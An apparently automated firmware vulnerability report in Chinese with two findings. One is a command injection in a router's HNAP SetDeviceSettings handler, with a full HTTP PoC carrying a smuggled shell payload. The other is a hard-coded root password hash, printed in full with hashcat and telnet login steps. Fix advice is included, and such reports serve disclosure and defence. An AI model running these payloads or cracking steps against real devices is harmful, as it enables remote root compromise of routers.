# 漏洞挖掘报告

> 会话 `s-mudsq59m-4d91` · 固件任务 `9160aafaa095` · 2026-10-09T08:07:15Z

## 一、任务信息

| 项 | 内容 |
| --- | --- |
| 任务目标 | 挖掘未授权RCE漏洞 |
| 引擎 | dsh（模式：dynamic） |
| 轮次 | 3 / 82 |

## 二、发现统计

| 危害等级 | 数量 |
| --- | --- |
| **高危** | 2 |
| 合计 | 2 |

### 危害等级分布

```
  高危　 │██████████████████████████  2
```

### 可达性分布

```
  static-only │██████████████████████████  2
```

### 高频目标二进制 Top8

```
  httpd　　　　　　　　　　　　　　　│██████████████████████████  1
  telnetd　　　　　　　　　　　　　│██████████████████████████  1
```

## 三、动态验证

- 摘录最近 13 条 trace，其中非空差分 0 条。

| Trace | 状态 | 入口 | 差分函数 | 备注 |
| --- | --- | --- | --- | --- |
| `b0b92b624b86` | failed | `net:80` | - | QemuError: target exited before port 11011 was ready (rc=125) |
| `0cbf6d44670d` | ok_empty_diff | `net:80` | 0 | - |
| `a55eabd4d91f` | ok_empty_diff | `net:80` | 0 | - |
| `81b17c135cf6` | ok_empty_diff | `net:80` | 0 | - |
| `49ee9cc34e5b` | ok_empty_diff | `net:80` | 0 | - |
| `78fed1ec8bbb` | ok_empty_diff | `net:80` | 0 | - |
| `8893a7ce0a65` | failed | `net:80` | - | QemuError: target exited before port 11001 was ready (rc=255) |
| `e59128b000e2` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-e59128b000e2-base.log: No such fil |
| `fff36e037aed` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fff36e037aed-base.log: No such fil |
| `fdac754d8326` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-fdac754d8326-base.log: No such fil |
| `ce186bd5f812` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-ce186bd5f812-base.log: No such fil |
| `a36c86d9208b` | failed | `stdin` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-a36c86d9208b-base.log: No such fil |
| `2f583960149b` | failed | `net:80` | - | QemuError: empty coverage log (target rc=1); check qemu can run the binary: qemu-mips: Error opening logfile /tmp/fwgraph-cov-2f583960149b-base.log: No such fil |

## 四、漏洞详情

### 漏洞 1：httpd HNAP SetDeviceSettings 动作 TZLocation 参数命令注入（exec_cmd 拼 shell，root 权限）（`F-mudtzc47-bfc8`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 命令注入 `CWE-78` |
| 危害等级 | **高危**（置信度 0.65） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd` |
| 二进制指纹 | `b18be6d07f1c97903c063686924ed3c7` |
| 漏洞位置 | `sub_470F24` @ `0x470f24` |
| 可达性 | static-only |

**漏洞描述**：httpd 的 HNAP 动作 SetDeviceSettings 会把 SOAP 参数 TZLocation 原样带入 shell 命令模板。sub_4716BC(SetDeviceSettings_put) → sub_4714DC 解析参数 → sub_470D80 仅用 snprintf(a3+172,33,"%s",TZLocation) 截断存包 → sub_470F24 取 a1+172 后调用 exec_cmd(...,"(fota -T %s; fota -I; fota -fQ) &",TZLocation)。该模板含 ; 与 & 等 shell 元字符，值未经任何 shell 转义（同函数对 DeviceName 走 sub_415DE4 处理，兄弟处理器 SetMultipleActions 甚至显式调用 str_shesc 做 shell 转义），因此 TZLocation 中注入 ";" 即可在 root 权限下执行任意命令。动作表 0x4ED9B0 中该动作 +4 鉴权标志为 1（需已登录会话），故为后认证 root 命令注入；表中免鉴权(flag=0)动作仅 GetDeviceSettings/Login/Logout，其处理函数无 exec 落点。

**漏洞证据**：

1. 动作表 httpd@0x4ED9B0（fw_read_bytes httpd@0x4EE2B0）：004c4b30 01000000 004716bc 004718c4 004714dc 0047178c —— 名称指针 0x4C4B30、+4 鉴权标志=1、set 处理器 0x4714DC
2. 名称字符串 httpd@0x4C4B10：GetDeviceSettings@0x4C4B1C(flag=0)、SetDeviceSettings@0x4C4B30(flag=1)、Login@0x4C4C8C(flag=0)、Logout@0x4C4C94(flag=0)
3. sub_4716BC(0x4716BC) 首行 sub_49A624("Enter %s\n","SetDeviceSettings_put")，随后调用 sub_4714DC
4. sub_4714DC(0x4714DC) 以 strcmp 匹配 Action/DeviceName/AdminPassword/ChangePassword/TZLocation 后调用 sub_470D80
5. sub_470D80(0x470D80)：snprintf(a3 + 172, 33, "%s", v12) —— 仅 33 字节截断，无转义
6. sub_470F24(0x470F24) 汇编：0x471238 li $t8, aFotaTSFotaIFot("(fota -T %s; fota -I; fota -fQ) &"); 0x47124c sw $s0(=struct+172 即 TZLocation) 作为 %s 实参; 0x471260 jal _exec_cmd; 参数 a1="ws-hnap/SetDeviceSettings.c" a2="save_CSID_SetDeviceSettings" a3=0xE9
7. 同函数内 DeviceName 走 sub_415DE4(0x415DE4) 处理后再进 event_notifier 模板；sub_47F030(SetMultipleActions_put) 对同类值显式调用 str_shesc() 做 shell 转义，而 TZLocation 路径未调用任何转义函数
8. 调用 sub_470F24 的分支条件：*(_BYTE*)(struct+172) 非空即进入 LABEL_19 执行 exec_cmd（无需 ChangePassword=true）

**调用链**：

```
httpd HNAP 请求分发（动作表 0x4ED9B0 表项 0x4C4B30 \"SetDeviceSettings\"，flag +4=1，set 处理器 0x4714DC）→ sub_4716BC @0x4716BC (SetDeviceSettings_put) → sub_4714DC @0x4714DC (解析 TZLocation) → sub_470D80 @0x470D80 (snprintf struct+172 = TZLocation) → sub_470F24 @0x470F24 → exec_cmd(\"(fota -T %s; fota -I; fota -fQ) &\") → /bin/sh
```

**漏洞 PoC**：

```
先完成 HNAP 登录取得会话 Cookie（uid=...），再发送：

POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://purenetworks.com/HNAP1/SetDeviceSettings"
Cookie: uid=<有效会话ID>
Content-Length: 342

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 <soap:Body>
  <SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">
   <DeviceName>dlinkrouter</DeviceName>
   <AdminPassword></AdminPassword>
   <ChangePassword>false</ChangePassword>
   <TZLocation>x; touch /tmp/pwned; id > /tmp/id_out;#</TZLocation>
  </SetDeviceSettings>
 </soap:Body>
</soap:Envelope>

服务端最终执行：/bin/sh -c "(fota -T x; touch /tmp/pwned; id > /tmp/id_out;#; fota -I; fota -fQ) &"（root 权限）
```

**修复建议**：对进入 exec_cmd/ shell 模板的所有 HNAP 参数统一调用平台既有转义函数 str_shesc()（或改用 execve 传参而非拼 shell 字符串）；TZLocation 应仅允许白名单时区串；同时复核同一 ws-hnap 模块内所有 exec_cmd 模板（SetDeviceSettings.c 的 event_notifier/fota、SetMultipleActions.c）的参数来源。


### 漏洞 2：固件内置固定 root 口令哈希并启动 telnetd（/etc/init_54FW 写 /etc/passwd，23/tcp 远程 root 后门）（`F-mudtzc51-eb6c`）

| 字段 | 内容 |
| --- | --- |
| 漏洞类型 | 硬编码凭据 `CWE-798` |
| 危害等级 | **高危**（置信度 0.55） |
| 影响组件 | `firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/usr/sbin/telnetd` |
| 二进制指纹 | `2476b288487c26e69f4656b150a41e38` |
| 漏洞位置 | `?` @ `-` |
| 可达性 | static-only |

**漏洞描述**：镜像内的初始化脚本 /etc/init_54FW 用重定向直接覆盖 /etc/passwd，写入唯一一条 root 记录并固定 SHA-512 crypt 口令哈希（root:$6$g8QQW/jew$QNWRqE3uFgr9WbAVaJ6fFoX2pS6trDUD29pT5MMvEj2EGj18SqTeSyra6ru2COfBVqut44zVBBS1uLid0mvme0:0:0::/home/:/bin/sh），紧接着以 root 身份启动 busybox telnetd（监听 23/tcp）。该口令哈希与型号绑定、不随用户/界面口令变化（脚本用 '>' 覆盖整个口令库），意味着同一型号所有设备的 root 口令哈希完全一致：离线爆破一次即可通杀全部在线设备，并绕过 Web 管理口令实现远程 root 登录。镜像 /etc 中不存在 passwd 文件，口令库完全由该脚本在设备初始化时生成，属于厂商预置后门凭据。

**漏洞证据**：

1. /etc/init_54FW 内容：echo 'root:$6$g8QQW/jew$QNWRqE3uFgr9WbAVaJ6fFoX2pS6trDUD29pT5MMvEj2EGj18SqTeSyra6ru2COfBVqut44zVBBS1uLid0mvme0:0:0::/home/:/bin/sh' > /etc/passwd
2. 同脚本紧随其后：tag '***** Init telnetd' 后执行 telnetd&（无 -l/-a 参数，默认监听 23/tcp，root 身份）
3. 镜像 etc/ 目录清点中不存在 passwd 文件，口令库由该脚本在初始化阶段覆盖生成，与 Web 管理口令相互独立
4. /etc/scripts/checkroot.sh：mount -n -o remount,$rootmode /（依据 /etc/fstab 以 rw 重挂根文件系统），使脚本对 /etc/passwd 的覆盖写可行；/etc/init.d/rcS 顺序执行 rc0..rc63 完成启动
5. telnetd 为 busybox applet（usr/sbin/telnetd → bin/busybox，md5 2476b288487c26e69f4656b150a41e38），identification 亦将其列为 IN-001 公网输入 23/tcp
6. 同一固定哈希在镜像中作为唯一口令来源，所有同型号设备共享，具备可离线爆破（hashcat -m 1800）并由单一口令横向通杀的特征

**调用链**：

```
设备初始化阶段执行 /etc/init_54FW → echo 'root:$6$g8QQW/jew$…' > /etc/passwd（固定 root 口令哈希）→ telnetd&（usr/sbin/telnetd → bin/busybox telnetd applet，md5 2476b288487c26e69f4656b150a41e38）→ 23/tcp 接受远程 root 登录
```

**漏洞 PoC**：

```
获取镜像后离线爆破固定哈希：hashcat -m 1800 '$6$g8QQW/jew$QNWRqE3uFgr9WbAVaJ6fFoX2pS6trDUD29pT5MMvEj2EGj18SqTeSyra6ru2COfBVqut44zVBBS1uLid0mvme0' rockyou.txt
得到口令后远程登录：
telnet <target> 23
login: root
password: <爆破所得口令>   → 直接获得 # root shell
```

**修复建议**：移除脚本中的固定口令哈希，改为首次启动随机生成（或仅在使用者显式开启调试时创建）；telnetd 默认关闭并以 dropbear/SSH 替代，或限制仅本地串口调试使用；出厂镜像不得包含任何可复用的 root 凭据。

